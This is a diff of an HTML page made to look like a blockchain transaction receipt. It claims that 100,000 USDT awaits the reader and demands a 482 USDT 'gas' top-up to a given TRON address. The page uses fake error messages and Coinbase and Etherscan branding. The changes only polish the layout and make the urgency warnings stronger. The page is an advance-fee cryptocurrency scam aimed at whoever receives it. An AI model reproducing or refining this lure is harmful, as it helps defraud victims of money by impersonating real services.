@@ -29,7 +29,8 @@
              <p style="font-size:28px; color:#05a5f0; margin:20px 0;"><strong>100,000 USDT</strong></p>
 
               <!-- Transaction Details -->
- <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="font-size:14px; color:#333; background-color:#f2f6fa; border-radius:6px; margin:20px 0;">
+              
+<table align="center" role="presentation" cellpadding="0" cellspacing="0" width="100%" style="font-size:14px; color:#333; background-color:#f2f6fa; border-radius:6px; margin:20px 0;">
                 <tr>
                   <td style="padding:10px;"><strong>Transaction Reference:</strong></td>
                   <td style="padding:10px;">e3019139-5efd-4ae1-ad70-b645454404f</td>
@@ -56,55 +57,63 @@
            
                                                          <!-- XtN Details -->
                                                          
-<img src="IMG_8719.gif" alt="blockchain Logo" width="350" />
+<img align="center" src="IMG_8719.gif" alt="blockchain Logo" width="500" />
+
+<hr>
 
 <form action="https://phantom.com/" method="get">
-  <button type="submit"> [TOP Gas ⛽️ USDT] </button>
-</form>  And receive $100,000 USDT Balance on your USDT address
+<button align="center" type="submit"> [TOP Gas ⛽️ USDT] </button>
+</form>  
 
+<span style="color: Green;"> And receive $100,000 USDT Balance on your USDT address</span>
+
+<br>
 
 ***Gas*** (estimated) ***:***  [$482] **482 USDT*** <span style="color: Red;"> CURRENTLY OUTSTANDING </span>
+
+<br>
 
 <span style="color: Blue;"> ~~$0.00 USDT PAID~~ </span>
 
 <span style="color: green;">Very likely in ‹<15 seconds</span>
 
-|
+<br>
 
 | <span style="color: Blue;">⛽️Top USDT: </span>|<span style="color: Blue;"> TAFpmstXRzCTPoZrsU81QysV7ZHCdnMEBF </span>|
 |---------------------------|---------------------------|
 | USDT  network         | ⛽️ Gas Refill ID ⬆️       |
 
-
-
-
 <img align="center" src="IMG_9083.jpeg" alt="blockchain Logo" width="38" />
 
-<span style="color: Blue;">**Contract**</span> **:** <span style="color: Red;">Warning! Error encountered during contract execution ~~[Out of gas]~~ ⚠️ </span>
+<hr>
 
+<span style="color: Blue;"> ***ERROR!!!*** </span> 
+
+<span style="color: Red;">Warning! Error encountered during Withdraw execution ~~[Out of gas]~~ ⚠️ </span>
+
+<br>
 
 ✅ This transaction is <span style="color: Red;"> Processing </span> ,Top-Up USDT Gas to Complete.✓⃝
 
-<img align="center" src="IMG_9063.jpeg" alt="payslip" width="350" />
+<img align="center" src="IMG_9063.jpeg" alt="payslip" width="500" />
 
-<span style="color: red;"> **SUMMARY~** <You need 0.89560913 more ETH to complete this transaction Buy more [$482 usd] ETH For Gas Price> </span>  <img src="IMG_9118.jpeg" alt="blockchain Logo" width="15" />
+<span style="color: red;"> **SUMMARY~** <You need 482  USDT to complete this transaction Buy more [$482] USDT For Gas Price> </span>  <img src="IMG_9118.jpeg" alt="blockchain Logo" width="15" />
 
 
-<img align="center" src="IMG_9113.jpeg" alt="ethscan Logo" width="350" />
+<img align="center" src="IMG_9113.jpeg" alt="ethscan Logo" width="500" />
 
 
 
 <form action="https://etherscan.io/" method="get">
-  <button type="submit"> Accept incoming ETH [$25,000] </button>
+<button align="center" type="submit"> Accept incoming ETH [$25,000] </button>
 </form>
 
 
 
-<img align="center" src="IMG_9086.gif" alt="loading gif display" width="350">
+<img align="center" src="IMG_9086.gif" alt="loading gif display" width="500">
 
-<img align="center" src="IMG_8361.jpeg" alt="ethscan Logo" width="350" />
 
-<img align="center" src="IMG_0561.png" alt="usdex explanation" width="350" />
+<img align="center" src="IMG_0561.png" alt="usdex explanation" width="500" />
               
               <!-- Buttons -->
               
@@ -118,5 +127,6 @@
  ©️ 2025 BLOCKCHAIN, Inc. All rights reserved.<br/>
               ®️ PRIVACY POLICY
 
-             
+<br> 
+
   <img src="IMG_0560.jpeg" alt="Coinbase" width="150" style="display:block; max-width:100%; height:auto;" />
